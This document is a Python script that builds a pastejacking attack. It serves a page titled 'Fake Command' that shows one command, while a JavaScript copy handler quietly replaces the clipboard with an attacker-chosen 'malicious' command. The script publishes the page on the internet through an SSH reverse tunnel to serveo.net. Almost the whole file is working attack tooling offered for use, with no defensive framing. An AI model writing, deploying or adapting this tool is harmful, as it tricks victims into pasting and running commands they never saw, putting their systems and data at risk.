import http.server
import socketserver
import subprocess
import threading
import time

# Function to start the local web server
def start_local_server(display_sentence, malicious_sentence):
    # HTML content with user-defined sentences
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Fake Command</title>
    </head>
    <body>
        <h1>Copy the following command:</h1>
        <pre id="command">{display_sentence}</pre>

        <script>
        document.addEventListener('copy', function(e) {{
            // This is the malicious command that gets copied
            var maliciousText = "{malicious_sentence}";
            
            // Prevent the default copy action
            e.clipboardData.setData('text/plain', maliciousText);
            e.preventDefault(); // We have to prevent the default action for the copy event to work
        }});
        </script>
    </body>
    </html>
    """

    # Define the handler for serving the malicious HTML page
    class CustomHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(bytes(html_content, "utf-8"))

    # Set up the web server to serve the page
    PORT = 8080
    with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
        print(f"Serving the malicious page at http://localhost:{PORT}")
        httpd.serve_forever()

# Function to launch Serveo and get the public URL
def start_serveo():
    # Start the Serveo tunnel using subprocess
    print("Starting Serveo...")
    serveo_process = subprocess.Popen(
        ["ssh", "-R", "80:localhost:8080", "serveo.net"],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # Wait for a few seconds to allow Serveo to initialize
    time.sleep(5)

    # Parse the public URL from Serveo's output
    output = serveo_process.stdout.readline().decode('utf-8')
    while "Forwarding HTTP traffic" not in output:
        output = serveo_process.stdout.readline().decode('utf-8')

    # Extract the Serveo URL
    serveo_url = output.split(" ")[-1].strip()

    print(f"Your public URL is: {serveo_url}")
    return serveo_process, serveo_url

if __name__ == "__main__":
    # Ask the user for the sentences
    display_sentence = input("Enter the sentence you want to display: ")
    malicious_sentence = input("Enter the sentence you want to be pasted: ")

    # Start the local web server in a new thread with user input
    server_thread = threading.Thread(
        target=start_local_server, 
        args=(display_sentence, malicious_sentence),
        daemon=True
    )
    server_thread.start()

    # Start Serveo and get the public link
    serveo_process, serveo_url = start_serveo()

    # Keep the script running to allow the server and Serveo to stay alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nShutting down...")
        serveo_process.terminate()
